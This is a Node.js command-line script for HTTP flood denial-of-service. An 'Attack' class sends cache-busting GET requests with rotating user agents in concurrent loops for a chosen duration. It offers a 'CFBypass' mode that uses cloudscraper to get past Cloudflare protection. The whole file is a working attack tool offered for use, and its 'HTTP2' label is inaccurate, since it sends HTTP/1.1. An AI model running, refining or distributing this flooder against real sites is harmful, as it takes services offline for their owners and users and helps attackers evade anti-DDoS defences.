const cloudscraper = require('cloudscraper');
const net = require('net');
const dns = require('dns').promises;

const userAgents = [
    // The list of user agents you provided
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Safari/537.36",
    // ... (truncated for brevity)
];

class Attack {
    constructor(url, port, threads, time, useCloudscraper) {
        this.url = url;
        this.port = port;
        this.threads = threads;
        this.time = time;
        this.useCloudscraper = useCloudscraper;
        this.userAgents = this.generateUserAgents();  // Generate user agents based on threads
    }

    generateUserAgents() {
        const agents = [];
        for (let i = 0; i < this.threads; i++) {
            agents.push(userAgents[Math.floor(Math.random() * userAgents.length)]);
        }
        return agents;
    }

    async getResolvedIP(hostname) {
        try {
            const addresses = await dns.lookup(hostname);
            return addresses.address;
        } catch (err) {
            console.error(`DNS resolution failed for ${hostname}:`, err);
            throw err;
        }
    }

    async sendPackets({ url, port, threads, time, useCloudscraper, userAgents }) {
        const { hostname } = new URL(url);
        let ip;
        try {
            ip = await this.getResolvedIP(hostname);
        } catch (err) {
            console.error("DNS FAILED:", err);
            return;
        }

        const endTime = Date.now() + time * 1000;

        const sendInThread = async (threadId) => {
            let requestsInThread = 0;

            while (Date.now() < endTime) {
                try {
                    const packet = this.buildPacket(ip, userAgents[threadId]);
                    if (useCloudscraper) {
                        await this.sendWithCloudscraper(ip, userAgents[threadId]);
                    } else {
                        await this.sendDirect(ip, port, packet);
                    }
                    requestsInThread++;
                    if (requestsInThread % 100 === 0) {
                        console.log(`[Thread ${threadId}] Requests: ${requestsInThread}`);
                    }
                } catch (err) {
                    console.error(`[Thread ${threadId}] Error: ${err.message}`);
                }
            }

            console.log(`[Thread ${threadId}] Completed with ${requestsInThread} requests.`);
        };

        // Start all threads concurrently
        const threadPromises = [];
        for (let i = 0; i < threads; i++) {
            threadPromises.push(sendInThread(i));
        }

        await Promise.all(threadPromises);
    }

    buildPacket(hostname, userAgent) {
        const randsemilla = Array.from({ length: 30 }, () =>
            'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]
        ).join('');
        return `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`;
    }

    async sendDirect(ip, port, packet) {
        return new Promise((resolve, reject) => {
            const sock = new net.Socket();
            sock.connect(port, ip, () => {
                sock.write(packet);
                sock.end();
                resolve();
            });
            sock.on('error', (err) => {
                sock.destroy();
                reject(err);
            });
        });
    }

    async sendWithCloudscraper(ip, userAgent) {
        try {
            await cloudscraper.get({
                url: `http://${ip}`,
                headers: {
                    'User-Agent': userAgent,
                    'Content-Length': 0,
                },
            });
        } catch (err) {
            console.error(`Cloudscraper Error: ${err.message}`);
        }
    }

    async start() {
        console.clear();
        const method = this.useCloudscraper ? 'CFBypass' : 'HTTP2';
        console.log(`Starting attack on ${this.url}`);
        console.log(`Using method: ${method}`);

        await this.sendPackets({
            url: this.url,
            port: this.port,
            threads: this.threads,
            time: this.time,
            useCloudscraper: this.useCloudscraper,
            userAgents: this.userAgents,
        });
    }
}

// Parse command-line arguments
const args = process.argv.slice(2);
if (args.length >= 3) {
    const [url, port, threads, time, useCloudscraperArg] = args;
    const useCloudscraper = useCloudscraperArg && useCloudscraperArg.toLowerCase() === 'true';
    const attack = new Attack(url, port, parseInt(threads), parseInt(time), useCloudscraper);
    attack.start();
} else {
    console.log("Usage: node http.js <url> <port> <threads> <time> [cf]");
}